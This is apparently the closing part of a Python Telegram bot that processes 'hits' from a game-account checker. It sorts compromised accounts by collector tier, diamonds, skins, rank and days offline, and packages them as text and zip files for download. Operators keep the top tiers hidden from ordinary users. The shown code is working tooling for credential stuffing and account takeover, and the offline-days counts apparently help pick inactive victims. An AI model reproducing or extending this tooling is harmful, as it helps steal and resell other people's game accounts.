        ctx.user_data["menu"] = "files"
        return

    parsed = _parse_selection_text(text, len(tiers))
    if not parsed:
        await update.message.reply_text("Invalid. Examples: 1 | 1,3,5 | 1-5 | SELECT ALL | DONE")
        return
    for i in parsed:
        selected.add(tiers[i - 1])
    lines = [f"Selected ({len(selected)}):"]
    for t in sorted(selected):
        lines.append(f"  - {t} ({len(buckets[t])})")
    lines.append("")
    lines.append("Type more, SELECT ALL, or DONE.")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_tier_select())


def _parse_selection_text(text, max_n):
    result = set()
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part and not part.startswith("-"):
            try:
                a, b = part.split("-", 1)
                a, b = int(a.strip()), int(b.strip())
                for x in range(min(a, b), max(a, b) + 1):
                    if 1 <= x <= max_n:
                        result.add(x)
            except ValueError:
                continue
        elif part.isdigit():
            x = int(part)
            if 1 <= x <= max_n:
                result.add(x)
    return sorted(result)


async def perform_tier_download(update, ctx, uid, tier_list):
    state = ctx.user_data.get("pending_tiers")
    if not state:
        await update.message.reply_text("Session expired.", reply_markup=kb_files())
        return
    buckets = state["buckets"]
    user_dir = USERS_DIR / str(uid)
    ts = int(time.time())
    tier_dir = user_dir / f"selected_{ts}"
    tier_dir.mkdir(parents=True, exist_ok=True)
    written = []
    total_acc = 0
    for tier in tier_list:
        items = buckets.get(tier, [])
        if not items:
            continue
        total_acc += len(items)
        slug = re.sub(r"[^A-Za-z0-9]+", "_", tier).strip("_") or "unknown"
        fp = tier_dir / f"{slug}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(f"##### {tier} - {len(items)} accounts #####\n\n")
            for r in items:
                (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
                 rank, hrank, dia, v2l, ts_, src, last_ts) = r
                days = _offline_days(last_ts)
                days_str = f"{days}d" if days is not None else "N/A"
                f.write(f"#{hid} - {dev}\n")
                f.write(f"  ID: {acc} ({zone})\n")
                f.write(f"  Name: {nick}\n")
                f.write(f"  Level: {lvl} | Skins: {skins}\n")
                f.write(f"  Rank: {rank} | Max: {hrank}\n")
                f.write(f"  Diamonds: {dia} | V2L: {v2l} | Offline: {days_str}\n\n")
        written.append(fp)
    await update.message.reply_text(
        f"TIER FILES READY\n\nTiers: {len(written)}\nAccounts: {total_acc}"
    )
    for fp in written:
        try:
            await update.message.reply_document(document=open(fp, "rb"),
                                                caption=fp.stem.replace("_", " "),
                                                reply_markup=kb_files())
        except Exception:
            pass
    try:
        shutil.rmtree(tier_dir, ignore_errors=True)
    except Exception:
        pass


async def send_tier_zip_all(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await update.message.reply_text("Empty.", reply_markup=kb_files())
        return
    user_dir = USERS_DIR / str(uid)
    tier_dir = user_dir / f"tiers_all_{int(time.time())}"
    tier_dir.mkdir(parents=True, exist_ok=True)
    buckets = {}
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        buckets.setdefault(r[7] or "No Tier", []).append(r)
    if not buckets:
        await update.message.reply_text("No visible hits.", reply_markup=kb_files())
        return
    for tier, items in buckets.items():
        slug = re.sub(r"[^A-Za-z0-9]+", "_", tier).strip("_") or "unknown"
        fp = tier_dir / f"{slug}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(f"##### {tier} - {len(items)} accounts #####\n\n")
            for r in items:
                (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
                 rank, hrank, dia, v2l, ts_, src, last_ts) = r
                days = _offline_days(last_ts)
                days_str = f"{days}d" if days is not None else "N/A"
                f.write(f"#{hid} - {dev}\n")
                f.write(f"  ID: {acc} ({zone})\n")
                f.write(f"  Name: {nick}\n")
                f.write(f"  Level: {lvl} | Skins: {skins}\n")
                f.write(f"  Rank: {rank} | Max: {hrank}\n")
                f.write(f"  Diamonds: {dia} | V2L: {v2l} | Offline: {days_str}\n\n")
    zip_path = user_dir / f"tiers_all_{int(time.time())}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fp in tier_dir.glob("*.txt"):
            zf.write(fp, fp.name)
    await update.message.reply_document(document=open(zip_path, "rb"),
                                        caption=f"All tier files ({len(buckets)} tiers)",
                                        reply_markup=kb_files())
    try:
        shutil.rmtree(tier_dir, ignore_errors=True)
        os.remove(zip_path)
    except Exception:
        pass


async def send_tier_breakdown(update, ctx, uid):
    stats = db_user_stats(uid)
    base_group = {}
    for base, roman, cnt in stats["tiers"]:
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        base_group.setdefault(base, {})[roman] = cnt
    lines = ["Collector Tier Breakdown:\n"]
    if not base_group:
        lines.append("(none)")
    else:
        for base in sorted(base_group.keys(), key=_base_sort_key):
            lines.append(f"{base}:")
            for roman, cnt in sorted(base_group[base].items(), key=lambda x: -ROMAN_ORDER.get(x[0], 0)):
                full = f"{base} {roman}".strip() if roman else base
                lines.append(f"  {full} -> {cnt}")
            lines.append("")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


async def send_rank_breakdown(update, ctx, uid):
    stats = db_user_stats(uid)
    lines = ["Rank Breakdown:\n"]
    if not stats["ranks"]:
        lines.append("(none)")
    else:
        for rank, cnt in sorted(stats["ranks"], key=lambda x: -x[1]):
            lines.append(f"  {rank or 'Unknown'} -> {cnt}")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


async def send_v2l_breakdown(update, ctx, uid):
    stats = db_user_stats(uid)
    lines = ["V2L Breakdown:\n"]
    if not stats["v2l"]:
        lines.append("(none)")
    else:
        for st, cnt in stats["v2l"]:
            lines.append(f"  {st or 'N/A'} -> {cnt}")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


async def send_offline_breakdown_stats(update, ctx, uid):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        rows = c.execute("SELECT last_login_ts, collector_base FROM hits WHERE user_id=?", (uid,)).fetchall()

    filtered_ts = []
    for last_ts, base in rows:
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        filtered_ts.append(last_ts or 0)

    counts = {label: 0 for label, _, _ in OFFLINE_BUCKETS}
    unknown = 0
    total = 0
    for ts_val in filtered_ts:
        days = _offline_days(ts_val)
        if days is None:
            unknown += 1
            continue
        bucket = _bucket_offline(days)
        if bucket in counts:
            counts[bucket] += 1
            total += 1
        else:
            unknown += 1

    lines = ["Offline Days Breakdown:", ""]
    max_count = max(counts.values()) if counts else 1
    max_count = max(max_count, 1)
    for label, _, _ in OFFLINE_BUCKETS:
        cnt = counts.get(label, 0)
        bar_len = int(20 * cnt / max_count) if max_count > 0 else 0
        bar = "#" * bar_len + "." * (20 - bar_len)
        lines.append(f"  {label:<12} {bar}  {cnt}")
    if unknown > 0:
        lines.append(f"  Unknown      {'-' * 20}  {unknown}")
    lines.append("")
    lines.append(f"Total with login: {total}")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


async def send_full_summary(update, ctx, uid):
    stats = db_user_stats(uid)
    lines = [
        "Full Summary:\n",
        f"Total hits: {stats['total']}",
        f"Total checks: {stats['checks']}",
    ]
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


# ======================================================================
#  ENTRY
# ======================================================================
def main():
    db_init()
    print(f"[+] {BOT_NAME} BOT starting...")
    print(f"[+] DEVELOPER - {DEVELOPER}")
    print(f"[+] DB: {DB_PATH}")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Button style supported: {_BUTTON_STYLE_SUPPORTED}")
    print(f"[+] MAX_THREADS: {MAX_THREADS}")
    print(f"[+] User hides: World Collector & above")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("[+] Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()